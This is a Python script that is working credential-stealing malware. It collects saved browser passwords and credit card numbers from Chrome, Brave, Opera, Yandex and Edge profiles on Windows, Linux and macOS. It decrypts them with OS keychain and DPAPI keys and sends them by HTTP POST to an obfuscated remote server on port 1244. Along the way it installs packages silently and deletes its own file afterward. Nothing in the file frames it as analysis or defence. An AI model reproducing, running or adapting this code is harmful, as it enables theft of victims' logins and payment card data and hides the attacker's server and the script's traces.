sType = 'ZU1RINz7'

from datetime import datetime,timedelta
from typing import Union,Type
from pathlib import Path
import base64,socket,os,re,json,sqlite3,shutil,time,platform,subprocess,sys,socket,os,re
_m='-m';_pp='pip';_inl='install'
os_type = platform.system()
if os_type=="Windows":
    try:import win32crypt
    except:subprocess.check_call([sys.executable,_m,_pp,_inl,'pywin32'])

try:import requests
except:subprocess.check_call([sys.executable,_m,_pp,_inl,'requests']);import requests
try:from Crypto.Hash import SHA1;from Crypto.Protocol.KDF import PBKDF2;from Crypto.Cipher import AES
except:subprocess.check_call([sys.executable,_m,_pp,_inl,'pycryptodome']);from Crypto.Hash import SHA1;from Crypto.Protocol.KDF import PBKDF2;from Crypto.Cipher import AES
if os_type=="Linux":
    try:import secretstorage
    except:subprocess.check_call([sys.executable,_m,_pp,_inl,'secretstorage']);import secretstorage

home = os.path.expanduser("~")
host="cuMTcx====NjcuMjAzLj"
ts = int(time.time()*1000)
hn = socket.gethostname()

host1 = base64.b64decode(host[10:] + host[:10]).decode()
host2 = f'http://{host1}:1244'

class BrowserVersion:
    def __str__(A):return A.base_name
    def __eq__(A,__o):return A.base_name==__o

class Chrome(BrowserVersion):base_name = "chrome";v_w = ["chrome", "chrome dev", "chrome beta", "chrome canary"];v_l = ["google-chrome", "google-chrome-unstable", "google-chrome-beta"];v_m = ["chrome", "chrome dev", "chrome beta", "chrome canary"]
class Brave(BrowserVersion):base_name = "brave";v_w = ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"];v_l = ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"];v_m = ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"]
class Opera(BrowserVersion):base_name = "opera";v_w = ["Opera Stable", "Opera Next", "Opera Developer"];v_l = ["opera", "opera-beta", "opera-developer"];v_m = ["com.operasoftware.Opera", "com.operasoftware.OperaNext", "com.operasoftware.OperaDeveloper"]
class Yandex(BrowserVersion):base_name = "yandex";v_w = ["YandexBrowser"];v_l = ["YandexBrowser"];v_m = ["YandexBrowser"]
class MsEdge(BrowserVersion):base_name = "msedge";v_w = ["Edge"];v_l = [];v_m = []

available_browsers = [Chrome, Brave, Opera, Yandex, MsEdge]

class ChromeBase:
    def __init__(A,verbose=True,blank_passwords=False):A.verbose=verbose;A.blank_passwords=blank_passwords;A.values=[];A.webs=[];A.target_os=platform.system()
    @staticmethod
    def get_datetime(chromedate):return datetime(1601,1,1)+timedelta(microseconds=chromedate)
    @staticmethod
    def get(func):
        def wrapper(*args):
            cls = args[0];sys_ = platform.system();base_name = cls.browser.base_name;vers = None

            if sys_== "Windows":vers=cls.browser.v_w
            elif sys_== "Linux":vers=cls.browser.v_l
            elif sys_== "Darwin":vers=cls.browser.v_m

            for ver in vers:
                for i in range(120):
                    if i==0:profile = "Default"
                    else:profile = "Profile " + str(i)

                    browser_path = cls.browsers_paths[base_name].format(ver=ver,profile=profile)
                    database_path = cls.browsers_database_paths[base_name].format(ver=ver,profile=profile)
                    browser_web_path = cls.browsers_web_paths[base_name].format(ver=ver,profile=profile)
                    
                    if os.path.exists(browser_path) and os.path.exists(database_path):
                        cls._browser_paths.append(browser_path)
                        cls._database_paths.append(database_path)
                    if os.path.exists(browser_web_path):
                        cls._browser_web_paths.append(browser_web_path)

                return func(*args)

        return wrapper

    @staticmethod
    def decrypt_windows_password(password, key):0

    @staticmethod
    def decrypt_unix_password(password: bytes, key: bytes) -> str:
        try:
            iv = b' ' * 16
            password = password[3:]
            cipher = AES.new(key, AES.MODE_CBC, IV=iv)
            return cipher.decrypt(password).strip().decode('utf8')
        except Exception:return ""

    def retrieve_database(self) -> list:
        temp_path = (home + "/AppData/Local/Temp") if self.target_os == "Windows" else "/tmp"
        database_paths, keys = self.database_paths, self.keys
        try:
            for database_path in database_paths:
                filename = os.path.join(temp_path, "LoginData.db")
                
                shutil.copyfile(database_path, filename)

                db = sqlite3.connect(filename) 
                cursor = db.cursor()
                cursor.execute(
                    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"
                )
                creation_time = "unknown"
                last_time_used = "unknown"
                key = keys[database_paths.index(database_path)]

                for row in cursor.fetchall():
                    ol = row[0];al = row[1];un = row[2];en_p = row[3];created = row[4];lastused = row[5]
                    if self.target_os == "Windows":pw = self.decrypt_windows_password(en_p, key)
                    elif self.target_os == "Linux" or self.target_os == "Darwin":pw = self.decrypt_unix_password(en_p, key)
                    else:pw = ""
                    if pw == "" and not self.blank_passwords:continue

                    if created and created != 86400000000:creation_time = str(self.__class__.get_datetime(created))
                    if lastused and lastused != 86400000000:last_time_used = self.__class__.get_datetime(lastused)

                    self.values.append(dict(origin_url=ol,action_url=al,username=un,password=pw,creation_time=creation_time,last_time_used=last_time_used))
                cursor.close();db.close()
                try:os.remove(filename)
                except OSError:pass
            return self.values
        except Exception as E:return []

    def retrieve_web(self):

        web_paths, keys = self.browser_web_paths, self.keys
        temp_path = (home + "/AppData/Local/Temp") if self.target_os == "Windows" else "/tmp"

        try:
            for web_path in web_paths: 
                filename = os.path.join(temp_path, "webdata.db")
                shutil.copyfile(web_path, filename)
                
                conn = sqlite3.connect(filename)
                cursor = conn.cursor()
                cursor.execute(
                    'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        
                key = keys[web_paths.index(web_path)]
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2] or not row[3]:
                        continue

                    if self.target_os == "Windows":card_number = self.decrypt_windows_password(row[3], key)
                    elif self.target_os == "Linux" or self.target_os == "Darwin":card_number = self.decrypt_unix_password(row[3], key)
                    else:card_number = ""

                    if card_number == "" and not self.blank_passwords:continue

                    self.webs.append(dict(name_on_card=row[0],expiration_month=row[1],expiration_year=row[2],card_number=card_number,date_modified=row[4]))

                cursor.close();conn.close()
                try:os.remove(filename)
                except OSError:pass
        except Exception as E:return []
        
    def pretty_print(self) -> str:
        o = ""
        for dict_ in self.values:
            for val in dict_:o += f"{val} : {dict_[val]}\n"
            o += '-' * 50 + '\n'

        for dict_ in self.webs:
            for val in dict_:o += f"{val} : {dict_[val]}\n"
            o += '-' * 50 + '\n'

        return o

    def save(self, fn: Union[Path, str], filepath: Union[Path, str], blank_file: bool = False, verbose: bool = True) -> bool:
        content = filepath + '\n' + self.pretty_print()
        options = {'ts': str(ts),'type': sType,'hid': hn,'ss': str(fn),'cc': content}
        url = host2+'/keys'        
        try:requests.post(url, data=options)
        except:return ""

class Windows(ChromeBase):
    def __init__(self,
                 browser: Type[BrowserVersion] = Chrome,
                 verbose: bool = True,
                 blank_passwords: bool = False):

        super(Windows, self).__init__(verbose, blank_passwords)
        self.browser = browser()

        self._browser_paths = []
        self._database_paths = []
        self._browser_web_paths = []

        self.keys = []
        base_path = home+"/AppData"

        self.browsers_paths = {
            "chrome": os.path.join(base_path, r"Local\\Google\\{ver}\\User Data\\Local State"),
            "opera": os.path.join(base_path, r"Roaming\\Opera Software\\{ver}\\Local State"),
            "brave": os.path.join(base_path, r"Local\\BraveSoftware\\{ver}\\User Data\\Local State"),
            "yandex": os.path.join(base_path, r"Local\\Yandex\\{ver}\\User Data\\Local State"),
            "msedge": os.path.join(base_path, r"Local\\Microsoft\\{ver}\\User Data\\Local State")
        }
        self.browsers_database_paths = {
            "chrome": os.path.join(base_path, r"Local\\Google\\{ver}\\User Data\\{profile}\\Login Data"),
            "opera": os.path.join(base_path, r"Roaming\\Opera Software\\{ver}{profile}\\Login Data"),
            "brave": os.path.join(base_path, r"Local\\BraveSoftware\\{ver}\\User Data\\{profile}\\Login Data"),
            "yandex": os.path.join(base_path, r"Local\\Yandex\\{ver}\\User Data\\{profile}\\Local State"),
            "msedge": os.path.join(base_path, r"Local\\Microsoft\\{ver}\\User Data\\{profile}\\Login Data")
        }
        self.browsers_web_paths = {
            "chrome": os.path.join(base_path, r"Local\\Google\\{ver}\\User Data\\{profile}"),
            "opera": os.path.join(base_path, r"Roaming\\Opera Software\\{ver}{profile}"),
            "brave": os.path.join(base_path, r"Local\\BraveSoftware\\{ver}\\User Data\\{profile}"),
            "yandex": os.path.join(base_path, r"Local\\Yandex\\{ver}\\User Data\\{profile}"),
            "msedge": os.path.join(base_path, r"Local\\Microsoft\\{ver}\\User Data\\{profile}")
        }

    @property
    def browser_paths(self):return self._browser_paths
    @property
    def database_paths(self):return self._database_paths
    @property
    def browser_web_paths(self):return self._browser_web_paths

    @ChromeBase.get
    def fetch(self):
        self.keys = [self.__class__.get_encryption_key(path) for path in self.browser_paths]
        return self.database_paths, self.keys

    @staticmethod
    def get_encryption_key(path: Union[Path, str]):
        try:
            with open(path, "r", encoding="utf-8") as file:
                local_state = file.read()
                local_state = json.loads(local_state)
        
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:] 
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except:
            return ""
    @staticmethod
    def decrypt_windows_password(password: bytes, key: bytes) -> str:
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except Exception:
            try:return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except Exception:return ""

class Linux(ChromeBase):

    def __init__(self,
                 browser: Type[BrowserVersion] = Chrome,
                 verbose: bool = False,
                 blank_passwords: bool = False):

        super(Linux, self).__init__(verbose, blank_passwords)

        self.browser = browser()
        
        self._browser_paths = []
        self._database_paths = []
        self._browser_web_paths = []

        self.keys = []
        base_path = os.getenv('HOME')
        con_p = "/.config/"

        self.browsers_paths = {
            "chrome": base_path + con_p + "{ver}/{profile}",
            "opera": base_path + con_p + "{ver}{profile}",
            "brave": base_path + con_p + "BraveSoftware/{ver}/{profile}",
            "yandex": "",
            "msedge": ""
        }
        self.browsers_database_paths = {
            "chrome": base_path + con_p + "{ver}/{profile}/Login Data",
            "opera": base_path + con_p + "{ver}{profile}/Login Data",
            "brave": base_path + con_p + "BraveSoftware/{ver}/{profile}/Login Data",
            "yandex": "",
            "msedge": ""
        }
        self.browsers_web_paths = {
            "chrome": base_path + con_p + "{ver}/{profile}",
            "opera": base_path + con_p + "{ver}{profile}",
            "brave": base_path + con_p + "BraveSoftware/{ver}/{profile}",
            "yandex": "",
            "msedge": ""
        }
    @property
    def browser_paths(self):return self._browser_paths
    @property
    def database_paths(self):return self._database_paths
    @property
    def browser_web_paths(self):return self._browser_web_paths

    @ChromeBase.get
    def fetch(self):
        key = self.get_encryption_key()
        if not key:return [],[]
        self.keys.append(key)
        return self.database_paths, self.keys

    def get_encryption_key(self) -> bytes:
        try:
            label = "Chrome Safe Storage"  # Default
            if self.browser=="opera":label="Chromium Safe Storage"
            elif self.browser=="brave":label="Brave Safe Storage"
            elif self.browser=="yandex":label="Yandex Safe Storage"

            passw = 'peanuts'.encode('utf8')
            bus = secretstorage.dbus_init()
            collection = secretstorage.get_default_collection(bus)
            for item in collection.get_all_items():  # Iterate
                if item.get_label() == label:passw = item.get_secret().decode("utf-8");break

            return PBKDF2(passw, b'saltysalt', 16, 1)
        except:return ""

class Mac(ChromeBase):
    def __init__(self,
                 browser: Type[BrowserVersion] = Chrome,
                 verbose: bool = True,
                 blank_passwords: bool = False):

        super(Mac, self).__init__(verbose, blank_passwords)
        self.browser = browser()
        self.keys = []
        self._browser_paths = []
        self._database_paths = []
        self._browser_web_paths = []
        basepath = "~/Library/Application Support/"

        self.browsers_paths = {
            "chrome": os.path.expanduser(basepath + "Google/{ver}/{profile}"),
            "opera": os.path.expanduser(basepath + "{ver}{profile}"),
            "brave": os.path.expanduser(basepath + "BraveSoftware/{ver}/{profile}"),
            "yandex": "",
            "msedge": ""
        }

        self.browsers_database_paths = {
            "chrome": os.path.expanduser(basepath + "Google/{ver}/{profile}/Login Data"),
            "opera": os.path.expanduser(basepath + "{ver}{profile}/Login Data"),
            "brave": os.path.expanduser(basepath + "BraveSoftware/{ver}/{profile}/Login Data"),
            "yandex": "",
            "msedge": ""
        }

        self.browsers_web_paths = {
            "chrome": os.path.expanduser(basepath + "Google/{ver}/{profile}"),
            "opera": os.path.expanduser(basepath + "{ver}{profile}"),
            "brave": os.path.expanduser(basepath + "BraveSoftware/{ver}/{profile}"),
            "yandex": "",
            "msedge": ""
        }

    @property
    def browser_paths(self):return self._browser_paths
    @property
    def database_paths(self):return self._database_paths
    @property
    def browser_web_paths(self):return self._browser_web_paths
    @ChromeBase.get
    def fetch(self):
        key = self.get_encryption_key()
        if not key:return [],[]

        self.keys.append(PBKDF2(key, b'saltysalt', 16, 1003, hmac_hash_module=SHA1))
        return self.database_paths, self.keys

    def get_encryption_key(self) -> Union[str, None]:
        try:
            label="Chrome"  # Default
            if self.browser=="opera":label="Opera"
            elif self.browser=="brave":label="Brave"
            elif self.browser=="yandex":label="Yandex"

            safe_storage_key = subprocess.check_output(
                f"security 2>&1 > /dev/null find-generic-password -ga '{label}'",
                shell=True)

            return re.findall(r'\"(.*?)\"', safe_storage_key.decode("utf-8"))[0]
        except:return ""

if os_type == "Windows":oss = Windows
elif os_type == "Darwin":oss = Mac
elif os_type == "Linux":oss = Linux
else:dir = os.getcwd();fn=os.path.join(dir,sys.argv[0]);os.remove(fn);sys.exit(-1)  # Clean exit
idx = 0
for br in available_browsers:
    px = oss(br, blank_passwords=False)
    px.fetch()
    px.retrieve_database()
    px.retrieve_web()
    bp1 = home + f"/{br.base_name}"    
    px.save(f"s{idx}", bp1, blank_file=False, verbose=True)
    idx += 1

dir = os.getcwd();fn=os.path.join(dir,sys.argv[0]);os.remove(fn)

